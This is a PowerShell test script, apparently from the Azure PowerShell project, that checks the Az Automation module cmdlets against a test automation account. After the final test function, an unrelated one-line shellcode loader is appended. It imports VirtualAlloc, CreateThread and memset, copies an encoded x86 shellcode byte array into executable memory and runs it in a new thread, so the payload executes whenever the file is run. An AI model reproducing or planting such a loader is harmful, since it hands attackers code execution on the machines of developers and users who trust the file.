$testAutomationAccount = @{
    ResourceGroupName = 'anatolib-azureps-test-rg'
    AutomationAccountName = 'anatolib-azureps-test-aa'
}

$testGlobalModule = @{
	Name = 'Azure'
	Version = '1.0.3'
	Size = 41338511
	ActivityCount = 673
}

$testNonGlobalModule = @{
    Name = 'Pester'
	Version = '3.0.3'
    ContentLinkUri = 'https://devopsgallerystorage.blob.core.windows.net/packages/pester.3.0.3.nupkg'
	Size = 74921
}

function EnsureTestModuleImported {
	$foundModule = Get-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -ErrorAction Ignore
    if ($foundModule) {
		if ($foundModule.ProvisioningState -ne 'Succeeded') {
			Remove-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -Force
			$foundModule = $null
		}
	}

    if (-not $foundModule) {
        $output = New-AzAutomationModule -Name $testNonGlobalModule.Name -ContentLinkUri $testNonGlobalModule.ContentLinkUri @testAutomationAccount
		Write-Verbose "Module $($testNonGlobalModule.Name) provisioning state: $($output.ProvisioningState)"

		$startTime = Get-Date
		$timeout = New-TimeSpan -Minutes 3
		$endTime = $startTime + $timeout

        while ($output.ProvisioningState -ne 'Succeeded') {
            [Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(10*1000)

            $output = Get-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount
			Write-Verbose "Module $($testNonGlobalModule.Name) provisioning state: $($output.ProvisioningState)"

			if ((Get-Date) -gt $endTime) {
				throw "Module $($testNonGlobalModule.Name) took longer than $timeout to import"
			}
        }
    }
}

function Remove-TestNonGlobalModule {
    if (Get-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -ErrorAction Ignore) {
        Remove-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -Force
    }
}


function Test-GetAllModules {
	$output = Get-AzAutomationModule @testAutomationAccount

	Assert-NotNull $output
	$outputCount = $output | Measure-Object | % Count;
	Assert-True { $outputCount -gt 1 } "Get-AzAutomationModule should output more than one object"

    $azureModule = $output | ?{ $_.Name -eq $testGlobalModule.Name }
	Assert-AreEqual $azureModule.AutomationAccountName $testAutomationAccount.AutomationAccountName
	Assert-AreEqual $azureModule.ResourceGroupName $testAutomationAccount.ResourceGroupName
	Assert-AreEqual $azureModule.Name $testGlobalModule.Name
	Assert-True { $azureModule.IsGlobal }
	Assert-AreEqual $azureModule.Version $testGlobalModule.Version
	Assert-AreEqual $azureModule.SizeInBytes $testGlobalModule.Size
	Assert-AreEqual $azureModule.ActivityCount $testGlobalModule.ActivityCount
	Assert-NotNull $azureModule.CreationTime
	Assert-NotNull $azureModule.LastModifiedTime
	Assert-AreEqual $azureModule.ProvisioningState 'Created'
}


function Test-GetModuleByName {
	$output = Get-AzAutomationModule -Name $testGlobalModule.Name @testAutomationAccount

	Assert-NotNull $output
	$outputCount = $output | Measure-Object | % Count;
	Assert-AreEqual $outputCount 1

	Assert-AreEqual $output.AutomationAccountName $testAutomationAccount.AutomationAccountName
	Assert-AreEqual $output.ResourceGroupName $testAutomationAccount.ResourceGroupName
	Assert-AreEqual $output.Name $testGlobalModule.Name
	Assert-True { $output.IsGlobal }
	Assert-AreEqual $output.Version $testGlobalModule.Version
	Assert-AreEqual $output.SizeInBytes $testGlobalModule.Size
	Assert-AreEqual $output.ActivityCount $testGlobalModule.ActivityCount
	Assert-NotNull $output.CreationTime
	Assert-NotNull $output.LastModifiedTime
	Assert-AreEqual $output.ProvisioningState 'Created'
}


function Test-NewModule {
	Remove-TestNonGlobalModule

	$output = New-AzAutomationModule -Name $testNonGlobalModule.Name -ContentLinkUri $testNonGlobalModule.ContentLinkUri @testAutomationAccount

	Assert-NotNull $output
	$outputCount = $output | Measure-Object | % Count;
	Assert-AreEqual $outputCount 1

	Assert-AreEqual $output.AutomationAccountName $testAutomationAccount.AutomationAccountName
	Assert-AreEqual $output.ResourceGroupName $testAutomationAccount.ResourceGroupName
	Assert-AreEqual $output.Name $testNonGlobalModule.Name
	Assert-False { $output.IsGlobal }
	Assert-Null $output.Version
	Assert-AreEqual $output.SizeInBytes 0
	Assert-AreEqual $output.ActivityCount 0
	Assert-NotNull $output.CreationTime
	Assert-NotNull $output.LastModifiedTime
	Assert-AreEqual $output.ProvisioningState 'Creating'
}


function Test-ImportModule {
    $command = Get-Command Import-AzAutomationModule
    Assert-AreEqual $command.CommandType 'Alias'
    Assert-AreEqual $command.Definition 'New-AzAutomationModule'
}


function Test-SetModule {
	EnsureTestModuleImported

	$output = Set-AzAutomationModule -Name $testNonGlobalModule.Name -ContentLinkUri $testNonGlobalModule.ContentLinkUri @testAutomationAccount

	Assert-NotNull $output
	$outputCount = $output | Measure-Object | % Count;
	Assert-AreEqual $outputCount 1

	Assert-AreEqual $output.AutomationAccountName $testAutomationAccount.AutomationAccountName
	Assert-AreEqual $output.ResourceGroupName $testAutomationAccount.ResourceGroupName
	Assert-AreEqual $output.Name $testNonGlobalModule.Name
	Assert-False { $output.IsGlobal }
	Assert-AreEqual $output.Version $testNonGlobalModule.Version
	Assert-AreEqual $output.SizeInBytes $testNonGlobalModule.Size
	Assert-AreEqual $output.ActivityCount 0
	Assert-NotNull $output.CreationTime
	Assert-NotNull $output.LastModifiedTime
	Assert-AreEqual $output.ProvisioningState 'Creating'
}


function Test-RemoveModule {
	EnsureTestModuleImported

	$output = Remove-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -Force

	Assert-Null $output
	$moduleFound = Get-AzAutomationModule -Name $testNonGlobalModule.Name @testAutomationAccount -ErrorAction Ignore
	Assert-Null $moduleFound
}

$6Ib = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6Ib -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0xb8,0xf1,0x59,0xc2,0x40,0x31,0x46,0x18,0x83,0xee,0xfc,0x03,0x46,0xe5,0xbb,0x37,0xbc,0xed,0xbe,0xb8,0x3d,0xed,0xde,0x31,0xd8,0xdc,0xde,0x26,0xa8,0x4e,0xef,0x2d,0xfc,0x62,0x84,0x60,0x15,0xf1,0xe8,0xac,0x1a,0xb2,0x47,0x8b,0x15,0x43,0xfb,0xef,0x34,0xc7,0x06,0x3c,0x97,0xf6,0xc8,0x31,0xd6,0x3f,0x34,0xbb,0x8a,0xe8,0x32,0x6e,0x3b,0x9d,0x0f,0xb3,0xb0,0xed,0x9e,0xb3,0x25,0xa5,0xa1,0x92,0xfb,0xbe,0xfb,0x34,0xfd,0x13,0x70,0x7d,0xe5,0x70,0xbd,0x37,0x9e,0x42,0x49,0xc6,0x76,0x9b,0xb2,0x65,0xb7,0x14,0x41,0x77,0xff,0x92,0xba,0x02,0x09,0xe1,0x47,0x15,0xce,0x98,0x93,0x90,0xd5,0x3a,0x57,0x02,0x32,0xbb,0xb4,0xd5,0xb1,0xb7,0x71,0x91,0x9e,0xdb,0x84,0x76,0x95,0xe7,0x0d,0x79,0x7a,0x6e,0x55,0x5e,0x5e,0x2b,0x0d,0xff,0xc7,0x91,0xe0,0x00,0x17,0x7a,0x5c,0xa5,0x53,0x96,0x89,0xd4,0x39,0xfe,0x7e,0xd5,0xc1,0xfe,0xe8,0x6e,0xb1,0xcc,0xb7,0xc4,0x5d,0x7c,0x3f,0xc3,0x9a,0x83,0x6a,0xb3,0x35,0x7a,0x95,0xc4,0x1c,0xb8,0xc1,0x94,0x36,0x69,0x6a,0x7f,0xc7,0x96,0xbf,0xea,0xc2,0x00,0x1f,0x38,0x18,0x5a,0xf7,0xbc,0xa1,0x49,0xc8,0x48,0x47,0x3d,0x98,0x1a,0xd8,0xfd,0x48,0xdb,0x88,0x95,0x82,0xd4,0xf7,0x85,0xac,0x3e,0x90,0x2f,0x43,0x97,0xc8,0xc7,0xfa,0xb2,0x83,0x76,0x02,0x69,0xee,0xb8,0x88,0x9e,0x0e,0x76,0x79,0xea,0x1c,0xee,0x89,0xa1,0x7f,0xb8,0x96,0x1f,0x15,0x44,0x03,0xa4,0xbc,0x13,0xbb,0xa6,0x99,0x53,0x64,0x58,0xcc,0xe8,0xad,0xcc,0xaf,0x86,0xd1,0x00,0x30,0x56,0x84,0x4a,0x30,0x3e,0x70,0x2f,0x63,0x5b,0x7f,0xfa,0x17,0xf0,0xea,0x05,0x4e,0xa5,0xbd,0x6d,0x6c,0x90,0x8a,0x31,0x8f,0xf7,0x0a,0x0d,0x46,0x31,0x79,0x7f,0x5a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Zxyp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Zxyp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Zxyp,0,0,0);for (;;){Start-sleep 60};

